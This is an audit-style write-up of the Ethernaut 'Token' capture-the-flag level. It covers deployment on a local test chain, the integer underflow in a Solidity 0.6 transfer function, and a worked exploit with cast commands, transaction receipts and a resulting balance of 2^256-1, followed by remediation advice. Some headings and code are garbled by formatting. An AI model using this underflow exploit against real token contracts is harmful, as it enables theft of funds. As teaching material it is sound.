# Smart Contract Security Audit: Level 05 - Token

## 1. Executive Summary

The target contract `Token` was audited to evaluate the safety of its token transfer and accounting logic. A critical arithmetic vulnerability—specifically an **Integer Underflow**—was identified in the core `transfer` function. This flaw stems from using an outdated Solidity compiler version (`^0.6.0`) without utilizing safe math wrappers or native checked arithmetic, allowing any account to artificially inflate its token balance to the maximum value supported by the EVM.

---

## 2. Environment Deployment & Baseline Analysis

### Infrastructure Setup Commands
The target contract was compiled and broadcasted to a local Anvil test network using the administrative deployer key:


# Command: Deploy Token contract with a 21M initial supply

/root/.foundry/bin/forge create src/levels/Token.sol:Token --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --constructor-args=21000000 --broadcast
Deployment Terminal Output ResultPlaintextDeployer: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Deployed to: 0x9A676e781A523b5d0C0e43731313A708CB607508
Transaction hash: 0x218ac09508aa9f367684e50c0aff88f7cb401228fa9703e71a1772a0cec13f5c

Baseline State Discrepancy & Level ProvisioningUpon executing an initial query against the player address (0x7099...), the target contract returned a balance of 0. This occurred because the constructor natively assigns the entire initial supply to the deployment entity (msg.sender).To perfectly simulate the actual Ethernaut level state—which seeds the player with a baseline balance of 20 tokens—an explicit provisioning transaction had to be executed from the wealthy deployer wallet over to the player wallet.

## Provisioning Command Executed:

cast send 0x9A676e781A523b5d0C0e43731313A708CB607508 "transfer(address,uint256)" 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 20 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

## Provisioning Transaction Terminal Output Result:
blockHash            0xf90deb5457797edd6aafad3a7df535bbb60bf68c610a830cb710c56635ed52d3
blockNumber          32
contractAddress      
cumulativeGasUsed    49140
effectiveGasPrice    16436884
from                 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
gasUsed              49140
logs                 []
logsBloom            0x0000000000000000...
status               1 (success)
transactionHash      0x75af4892b9c10826d214b504c55a4ffe87a4e9b230d8aa49de57dcef3aefdefd
to                   0x9A676e781A523b5d0C0e43731313A708CB607508

## Definition of Provisioning Result: status:

1 (success) confirms the transfer completed without a revert. The player account was now successfully backed by an official starting ledger state of 20 tokens.

## Active Player State Verification QueryBash# Command:

Query player balance post-provisioning
cast call 0x9A676e781A523b5d0C0e43731313A708CB607508 "balanceOf(address)(uint256)" 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545)

## Terminal Output Returned: 20Definition of Result: 

The player mapping vector explicitly registers 20 units, achieving parity with the official Ethernaut runtime framework.

## Vulnerability AnalysisThe 

Flawed Transfer LogicThe contract implements a standard token routing function, but relies on unshielded legacy arithmetic:

Solid

ityfunction transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}

## Deep Dive: Solidity ^0.6.0 vs. Native Arithmetic Bounds

In Solidity versions before 0.8.0, arithmetic operations wrapping around upper or lower storage limits did not cause the execution environment to throw an error or revert. Instead, they failed silently via wrap-around behaviors:
 - The Flawed require Condition: balances[msg.sender] - _value >= 0Because balances maps to an unsigned integer type (uint256), the result can never be negative. If the mathematical outcome is lower than 0 (e.g., $20 - 21 = -1$), the value underflows across the lower boundary and wraps entirely around to its maximum capacity ($2^{256} - 1$). Since this astronomical positive number is obviously greater than or equal to 0, the require statement mistakenly passes validation.
 - The Underflow State Change: balances[msg.sender] -= _value;The contract applies the unchecked wrapped calculation directly to the player's balance slot, permanently rewriting their ledger entry.
 
## Exploitation Proof of Concept (PoC)
Triggering the Attack Vector
Using the Player's private key (0x59c6...), a transaction was dispatched to send 21 tokens to an arbitrary burner address (0x00...01). This intentionally forced a negative balance operation ($20 - 21$):

# Command: Execute underflow by passing a transfer value greater than current balance
cast send 0x9A676e781A523b5d0C0e43731313A708CB607508 "transfer(address,uint256)" 0x0000000000000000000000000000000000000001 21 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545) --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d

## Exploit Transaction Receipt Output Result

blockHash            0x1d2abb6f06f8de6550398223d602183cfca15e5d31131327b15a21e4d5ceedc0
blockNumber          33
contractAddress      
cumulativeGasUsed    48912
effectiveGasPrice    14389005
from                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
gasUsed              48912
logs                 []
logsBloom            0x0000000000000000...
status               1 (success)
transactionHash      0x187384bf633bceac981689ff7e266fee39ac8e7dbe7cdb58b3565decea01dbf3
to                   0x9A676e781A523b5d0C0e43731313A708CB607508

## Definition of Transaction Fields:
- from: The player wallet (0x7099...) that initiated the checked subtraction error.
- status: 1 (success): Confirms that the target contract accepted the negative math check as a valid execution stream and successfully updated state storage.

## Final Verification Call 
Command: Re-verify the player balance post-exploit
cast call 0x9A676e781A523b5d0C0e43731313A708CB607508 "balanceOf(address)(uint256)" 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 --rpc-url [http://127.0.0.1:8545](http://127.0.0.1:8545)

## Final Terminal Output:
115792089237316195423570985008687907853269984665640564039457584007913129639935

## Definition of Final State: The output confirms that the player address successfully forced an integer underflow, yielding the maximum value of $2^{256} - 1$.

## Lessons Learned & Remediation
Key Security Take always 
 - Legacy compilation targets require explicit math assertions. Never trust raw mathematical operators (+, -, *, /) in smart contracts running compiler flags below 0.8.0.
 - Flawed bounds checking creates catastrophic failures. Checking if an unsigned integer is >= 0 is a dead check because an unsigned integer can inherently never drop below zero at runtime.
 
## Remediation Guidance
- Upgrade to Modern Solidity Versions: Compile all production systems utilizing Solidity ^0.8.0. Beginning with version 0.8.0, the compiler natively flags and automatically reverts transactions when arithmetic overflows or underflows occur.
- Utilize SafeMath Libraries on Older Compilers: If forced to maintain legacy target systems below version 0.8.0, wrap all arithmetic checks with OpenZeppelin's SafeMath library to catch wrapping occurrences before state mutations occur:

// Remediated Legacy Code Pattern
using SafeMath for uint256;

function transfer(address _to, uint256 _value) public returns (bool) {
    balances[msg.sender] = balances[msg.sender].sub(_value); // Reverts cleanly on underflow
    balances[_to] = balances[_to].add(_value);
    return true;
}

